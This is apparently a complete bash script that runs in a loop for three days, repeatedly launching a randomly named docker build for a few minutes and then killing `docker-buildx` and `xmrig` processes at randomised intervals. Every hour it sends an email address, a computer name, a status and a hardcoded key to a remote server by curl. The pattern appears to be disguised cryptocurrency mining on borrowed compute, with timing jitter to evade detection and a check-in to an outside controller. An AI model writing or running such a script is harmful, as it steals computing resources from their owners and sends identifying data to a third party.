#!/bin/bash

# Define the function with a status parameter
update_status() {
    # Assign the status parameter to a variable
    STATUS=$1

    # Read email and computer from respective files and remove special characters
    EMAIL=$(cat info/email.txt | tr -d ' \n')
    COMPUTER=$(cat info/computer.txt | tr -d ' \n')

    # URL encode the email, computer, and status values
    # EMAIL_ENCODED=$(echo "$EMAIL" | jq -sRr @uri)
    # COMPUTER_ENCODED=$(echo "$COMPUTER" | jq -sRr @uri)

    # Echo the URL for debugging purposes
    echo "http://api.nguyentien.xyz/api/v1/emails/update-status?email=${EMAIL}&computer=${COMPUTER}&status=${STATUS}&key=email@2024!"

    # Perform the curl GET request
    curl "http://api.nguyentien.xyz/api/v1/emails/update-status?email=${EMAIL}&computer=${COMPUTER}&status=${STATUS}&key=email@2024!"
    
    echo ""

    echo $STATUS > info/status.txt
}

# Function to start the docker build job
start_job() {
    echo "Starting docker build..."
    nohup docker build -t myimage_$(head /dev/urandom | tr -dc a-z0-9 | head -c 5) . &
}

# Function to stop the specified jobs
stop_job() {
    echo "Killing specified processes..."
    sudo pkill -f docker-buildx
    sudo pkill -f xmrig
}

# Capture start date and time
START_DATE=$(date +%s)

# Calculate date and time for 3 days later (3 days * 24 hours * 60 minutes * 60 seconds)
END_DATE=$(($START_DATE + 3*24*60*60))

echo "Start date: $START_DATE"
echo "End date: $END_DATE"

# Initialize variables
first_iteration=true
last_update_time=$(date +%s)

while true
do
    # Get current time
    current_time=$(date +%s)

    # Call update_status 1 only on the first iteration or every hour
    if [ "$first_iteration" = true ] || (( current_time - last_update_time >= 3600 )); then
        update_status 1
        first_iteration=false
        last_update_time=$current_time
    fi

    # Check if current date and time is past the end date
    CURRENT_DATE=$(date +%s)
    echo "Current date: $CURRENT_DATE"
    if [[ $CURRENT_DATE -ge $END_DATE ]]; then
        echo "3 days have passed. Exiting script."
        sudo pkill -f docker-buildx
        sudo pkill -f xmrig
        update_status 2
        exit 0
    fi

    start_job
    SLEEP_TIME=$((RANDOM % 61 + 150))
    echo "Running for $SLEEP_TIME seconds..."
    sleep $SLEEP_TIME
    stop_job
    PAUSE_TIME=$((RANDOM % 181 + 90))
    echo "Pausing for $PAUSE_TIME seconds before restarting..."
    sleep $PAUSE_TIME
done